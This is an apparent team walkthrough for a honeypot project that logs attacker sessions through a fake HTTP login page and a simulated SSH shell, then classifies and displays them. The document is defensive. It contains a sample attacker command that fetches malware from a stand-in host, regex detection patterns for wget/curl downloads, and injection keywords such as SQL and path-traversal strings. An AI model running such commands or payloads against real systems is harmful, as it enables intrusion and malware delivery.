# Network Honeypot - Team Walkthrough

## 📚 Purpose of This Document

This walkthrough explains the **end-to-end lifecycle** of how our honeypot captures attacker activity, from the moment a connection arrives to when it appears in the analytics dashboard. Every team member should understand this flow to effectively maintain, present, and extend the project.

---

## 🔄 Attack Lifecycle: From Connection to Dashboard

### Step 1: Attacker Initiates Connection

**What Happens:**
An attacker's scanning tool or bot discovers our honeypot server and attempts to connect:
- **HTTP**: Connects to port 8080 (fake login portal)
- **SSH**: Connects to port 2222 (fake SSH server)

**Code Location:**
- HTTP: `app/decoy_http/server.py` - Flask routes handle incoming HTTP requests
- SSH: `app/decoy_ssh/server.py` - Paramiko accepts TCP connections on SSH port

**Example:**
```bash
# Attacker runs:
curl http://your-honeypot-ip:8080/admin
# or
ssh root@your-honeypot-ip -p 2222
```

---

### Step 2: Session Creation & Metadata Capture

**What Happens:**
The moment a connection is established, the honeypot creates a unique session record with UUID and captures metadata:
- Source IP address and port
- Destination port (8080 or 2222)
- Protocol type (HTTP or SSH)
- User-Agent (HTTP) or SSH client version (SSH)
- UTC timestamp

**Code Location:**
- `app/core/session.py` - `SessionManager.create_session()`
- `app/storage/database.py` - `Database.create_session()`

**Database Impact:**
A new row is inserted into the `sessions` table:
```sql
INSERT INTO sessions (session_id, source_ip, source_port, dest_port, protocol, started_at, ...)
VALUES ('a1b2c3d4-...', '203.0.113.42', 54321, 8080, 'http', '2026-11-20T15:00:00Z', ...);
```

**Why This Matters:**
Every attacker interaction is tied to a session UUID, allowing us to reconstruct complete attack timelines even from fragmented logs.

---

### Step 3: Credential Capture (Authentication Phase)

**What Happens:**

#### HTTP Path:
1. Attacker sees fake "Acme Corp Employee Portal" login page
2. Submits username/password via POST to `/login`
3. Honeypot extracts credentials from form data
4. Password is **immediately hashed with bcrypt** (never stored plaintext)
5. Authentication always fails with "Invalid credentials" message

#### SSH Path:
1. Attacker attempts SSH authentication
2. Paramiko's `check_auth_password()` callback is triggered
3. Honeypot logs username and hashed password
4. Authentication always returns `AUTH_FAILED`

**Code Location:**
- HTTP: `app/decoy_http/server.py` - `@app.route('/login', methods=['POST'])`
- SSH: `app/decoy_ssh/server.py` - `SSHServer.check_auth_password()`
- Password hashing: Both use `bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())`

**Database Impact:**
```sql
INSERT INTO auth_attempts (session_id, timestamp, username, password_hash, auth_method, success)
VALUES ('a1b2c3d4-...', '2026-11-20T15:00:05Z', 'admin', '$2b$12$...', 'password', 0);
```

**Security Note:**
We **never** store plaintext passwords. Bcrypt hashing ensures that even if the database is compromised, attackers cannot reverse engineer the captured passwords. This is critical because attackers often reuse victims' real passwords.

---

### Step 4: Interactive Session Logging

**What Happens:**

#### HTTP Path:
Every HTTP request (GET/POST) is logged:
- Request method (GET, POST, PUT, DELETE)
- URL path and query parameters
- Request body content
- HTTP headers (as JSON)
- Classified attack signature (SQLi, XSS, LFI, etc.)

#### SSH Path:
After auth failure, some sophisticated honeypots simulate a shell anyway (for deeper intelligence):
1. Fake MOTD (Message of the Day) is displayed
2. Attacker sees realistic bash prompt: `ubuntu@prod-db-01:~$`
3. Each command entered is captured character-by-character
4. Command is sent to shell simulator
5. Fake but realistic output is generated and sent back
6. Command is classified (recon, download, exploit, persistence, etc.)
7. Everything is logged to the database

**Code Location:**
- HTTP classification: `app/core/classifiers.py` - `classify_http_request()`
- SSH simulation: `app/decoy_ssh/shell.py` - `ShellSimulator.process_command()`
- SSH command handling: `app/decoy_ssh/server.py` - `handle_ssh_client()`
- Command classification: `app/core/classifiers.py` - `classify_ssh_command()`

**Example SSH Flow:**
```
Attacker types: whoami
Honeypot sends: ubuntu
Logs to DB: command='whoami', classification='recon', mitre='T1082'

Attacker types: wget http://evil.com/malware
Honeypot sends: bash: wget: command not found
Logs to DB: command='wget...', classification='download', mitre='T1105'
```

**Database Impact:**
```sql
INSERT INTO interactions (session_id, timestamp, interaction_type, command, command_classification, fake_output)
VALUES ('a1b2c3d4-...', '2026-11-20T15:00:10Z', 'ssh_command', 'whoami', 'recon', 'ubuntu');
```

**Why This Matters:**
Command-by-command logging reveals attacker methodology. We can see if they're:
- Doing basic recon (`whoami`, `uname -a`)
- Downloading malware (`wget`, `curl`)
- Establishing persistence (`crontab`, adding SSH keys)
- Attempting privilege escalation (`sudo`, `chmod +s`)

This maps directly to **MITRE ATT&CK** techniques used by real threat actors.

---

### Step 5: Attack Classification & Pattern Matching

**What Happens:**
Every command or HTTP request is run through regex-based pattern matching to identify:

**SSH Command Categories:**
- `recon`: System information discovery (T1082)
- `download`: Ingress tool transfer (T1105)
- `exploit`: Command execution attempts (T1059)
- `persistence`: Scheduled tasks, user creation (T1053)
- `credential_access`: Searching for passwords/keys (T1552)
- `cryptominer`: Cryptocurrency mining activity (T1496)

**HTTP Attack Signatures:**
- `sqli`: SQL injection patterns (`union select`, `or 1=1`)
- `xss`: Cross-site scripting (`<script>`, `onerror=`)
- `lfi`: Local file inclusion (`../etc/passwd`)
- `rce`: Remote code execution (command injection)
- `path_traversal`: Directory traversal attempts
- `wordpress_scan`: WordPress probing
- `phpmyadmin_scan`: phpMyAdmin enumeration

**Code Location:**
- `app/core/classifiers.py` - All classification logic and regex patterns

**Example Regex Pattern:**
```python
COMMAND_PATTERNS = {
    'download': {
        'patterns': [
            r'\b(wget|curl)\s+.*https?://',
            r'\b(tftp|ftp).*get\b',
        ],
        'mitre': 'T1105',
        'description': 'Downloading malware or tools'
    }
}
```

**Why This Matters:**
Raw logs are useless without context. Classification lets us:
- Quantify attack types (40% SQLi, 30% brute force, 20% recon)
- Track attacker progression (recon → download → persistence)
- Generate alerts for critical patterns (cryptominers, reverse shells)
- Build threat intelligence feeds

---

### Step 6: IP Enrichment & Geolocation

**What Happens:**
When a new IP connects for the first time, the enrichment module:

1. **Checks if IP is private/reserved:**
   - RFC1918 private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
   - Loopback (127.0.0.0/8)
   - Link-local (169.254.0.0/16)
   
   If yes → Tagged as `PRIVATE` or `RESERVED`, no further lookup

2. **Performs GeoIP Lookup (if available):**
   - Loads MaxMind GeoLite2 database (`.mmdb` file)
   - Queries for city-level geolocation
   - Extracts: country code, country name, city, lat/long, ASN

3. **Handles Offline Mode:**
   - If GeoIP database not found → Tagged as `OFFLINE`
   - Honeypot continues functioning without enrichment

4. **Caches Results:**
   - IP enrichment data stored in `ip_intel` table
   - Subsequent connections from same IP reuse cached data

**Code Location:**
- `app/enrichment/ip_lookup.py` - `IPEnricher.enrich()`

**Database Impact:**
```sql
INSERT INTO ip_intel (ip_address, last_updated, country_code, country_name, latitude, longitude, ...)
VALUES ('203.0.113.42', '2026-11-20T15:00:00Z', 'CN', 'China', 39.9042, 116.4074, ...);
```

**Why This Matters:**
Geolocation reveals attack origins:
- **High activity from China/Russia**: Common botnet sources
- **Unexpected EU/US IPs**: Potentially compromised servers or VPN exits
- **ASN analysis**: Identifies hosting providers popular with attackers

---

### Step 7: Session Termination & Duration Calculation

**What Happens:**
When attacker disconnects:
1. Session end time is recorded
2. Duration is calculated (`ended_at - started_at`)
3. Session marked as `ended` in database
4. Session removed from active session manager

**Code Location:**
- `app/storage/database.py` - `Database.end_session()`
- `app/core/session.py` - `Session.duration_seconds()`

**Database Impact:**
```sql
UPDATE sessions
SET ended_at = '2026-11-20T15:05:30Z', duration_seconds = 330.0
WHERE session_id = 'a1b2c3d4-...';
```

**Metrics We Track:**
- Average session duration (longer = more sophisticated attacker)
- Sessions per IP (repeat offenders)
- Time between auth attempts (automated vs. manual)

---

### Step 8: Dashboard Visualization

**What Happens:**
The Flask-based dashboard queries the SQLite database to display:

**Overview Page (`/`):**
- Total sessions count
- Unique attacking IPs
- Credentials captured
- Active sessions (real-time)
- Top 10 attacking IPs
- Top 10 attempted usernames

**Sessions Page (`/sessions`):**
- Paginated list of all sessions
- Sortable by time, protocol, IP
- Click session ID to view full details

**Session Detail Page (`/session/<id>`):**
- Complete session metadata
- All authentication attempts
- Full command/HTTP request log
- Attack classifications and MITRE ATT&CK tags

**API Endpoints:**
- `/api/stats` - JSON statistics for external integration
- `/api/sessions` - Session list with pagination
- `/api/timeline` - Time-series attack frequency data
- `/api/geo_map` - Geographic distribution (for map visualization)

**Code Location:**
- `app/dashboard/app.py` - All Flask routes and API endpoints
- `app/dashboard/templates/*.html` - Dashboard HTML templates

**Example Query:**
```python
# app/dashboard/app.py
@app.route('/api/stats')
def api_stats():
    stats = db.get_stats()  # Queries DB for aggregates
    return jsonify(stats)   # Returns JSON for charts
```

**Why This Matters:**
The dashboard transforms raw telemetry into **actionable intelligence**:
- Security teams see attack trends at a glance
- Incident responders drill into specific sessions
- Threat researchers export data for further analysis
- Executives see attack volume metrics

---

## 🛡️ Security Design Principles

### 1. **Zero Execution Guarantee**
**Problem:** Attacker might try command injection to escape the honeypot.

**Solution:**
- All commands are treated as **strings only**
- No use of `subprocess`, `os.system()`, `eval()`, or `exec()`
- Shell simulator uses pure pattern matching and pre-generated responses

**Code Evidence:**
```python
# app/decoy_ssh/shell.py
def _generate_output(self, command: str) -> str:
    """Generate fake output - NEVER executes real commands"""
    if cmd_lower == 'whoami':
        return self.username  # Hardcoded fake response
    # No subprocess.run() anywhere!
```

---

### 2. **Password Hashing (Never Plaintext)**
**Problem:** Database compromise would expose attacker passwords (which might be reused victim passwords).

**Solution:**
- Bcrypt hashing with unique salt for every password
- Hashing happens **immediately** upon capture, before any logging

**Code Evidence:**
```python
# app/decoy_http/server.py
password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
```

---

### 3. **Thread Safety (Concurrent Sessions)**
**Problem:** Multiple attackers connecting simultaneously could corrupt database.

**Solution:**
- SQLite in WAL (Write-Ahead Logging) mode for concurrent reads
- Mutex lock on all database write operations
- Each session handled in separate thread

**Code Evidence:**
```python
# app/storage/database.py
class Database:
    def __init__(self):
        self._lock = threading.Lock()
    
    def log_interaction(self, data):
        with self._lock:  # Thread-safe write
            conn = self._get_connection()
            # ... write to DB
```

---

### 4. **Graceful Offline Operation**
**Problem:** GeoIP database might not exist, or internet down for API lookups.

**Solution:**
- GeoIP enrichment is optional
- Missing database → Tagged as `OFFLINE` but honeypot continues
- Private/reserved IPs handled without external lookups

**Code Evidence:**
```python
# app/enrichment/ip_lookup.py
if not Path(mmdb_path).exists():
    print("[!] GeoIP database not found - enrichment disabled")
    # Honeypot still functions!
```

---

## 🗂️ Data Flow Summary

```
┌─────────────────────────────────────────────────────────────┐
│                   ATTACKER CONNECTION                        │
└────────────┬────────────────────────────────────────────────┘
             │
             ▼
    ┌────────────────────┐
    │  Session Created   │  ─────> sessions table
    │  (UUID generated)  │
    └────────┬───────────┘
             │
             ▼
    ┌────────────────────┐
    │ Credential Capture │  ─────> auth_attempts table
    │ (bcrypt hashed)    │
    └────────┬───────────┘
             │
             ▼
    ┌────────────────────┐
    │ Command/HTTP Log   │  ─────> interactions table
    │ (with classifier)  │
    └────────┬───────────┘
             │
             ▼
    ┌────────────────────┐
    │  IP Enrichment     │  ─────> ip_intel table
    │  (GeoIP lookup)    │
    └────────┬───────────┘
             │
             ▼
    ┌────────────────────┐
    │ Session Ends       │  ─────> UPDATE sessions.ended_at
    │ (duration calc)    │
    └────────┬───────────┘
             │
             ▼
    ┌────────────────────┐
    │ Dashboard Display  │  ←────  Flask queries SQLite
    │ (analytics/API)    │
    └────────────────────┘
```

---

## 🧪 Testing the Complete Flow

### Test HTTP Attack End-to-End:
```bash
# 1. Start honeypot
python -m app.main

# 2. Simulate attack
curl -X POST http://localhost:8080/login -d "username=admin&password=test123"

# 3. Check database
sqlite3 data/honeypot.db "
SELECT s.session_id, s.source_ip, a.username, i.http_method, i.http_path
FROM sessions s
LEFT JOIN auth_attempts a ON s.session_id = a.session_id
LEFT JOIN interactions i ON s.session_id = i.session_id
WHERE s.protocol = 'http'
ORDER BY s.started_at DESC LIMIT 1;
"

# 4. View in dashboard
# Open: http://localhost:5000
```

### Test SSH Attack End-to-End:
```bash
# 1. Attempt SSH connection
ssh root@localhost -p 2222
# (Try password: password)

# 2. Check captured credentials
sqlite3 data/honeypot.db "
SELECT username, timestamp FROM auth_attempts 
WHERE auth_method='password' 
ORDER BY timestamp DESC LIMIT 5;
"
```

---

## 📚 Code Organization for Team

**If you need to modify...**

| Feature | File to Edit |
|---------|-------------|
| Add new fake command response | `app/decoy_ssh/shell.py` |
| Add new attack classification | `app/core/classifiers.py` |
| Change HTTP login page design | `app/decoy_http/server.py` (LOGIN_PAGE template) |
| Add new dashboard chart | `app/dashboard/app.py` + templates |
| Change database schema | `app/storage/database.py` (_init_schema) |
| Add new enrichment source | `app/enrichment/ip_lookup.py` |
| Adjust configuration defaults | `app/core/config.py` or `.env` |

---

## 🎯 Key Takeaways for Team Presentations

1. **Zero False Positives**: Every connection to the honeypot is unauthorized (no production traffic)
2. **Complete Attack Reconstruction**: UUID-based sessions let us replay entire attack sequences
3. **MITRE ATT&CK Mapping**: Every action classified to industry-standard TTP framework
4. **Privacy-Preserving**: Passwords hashed, no sensitive data exposed
5. **Production-Ready**: Thread-safe, gracefully handles failures, runs 24/7

---

## 🔗 Related Documentation
- `README.md` - Project overview and quick start
- `ARCHITECTURE.md` - System design and database schema
- `PLAN.md` - Implementation roadmap and phases
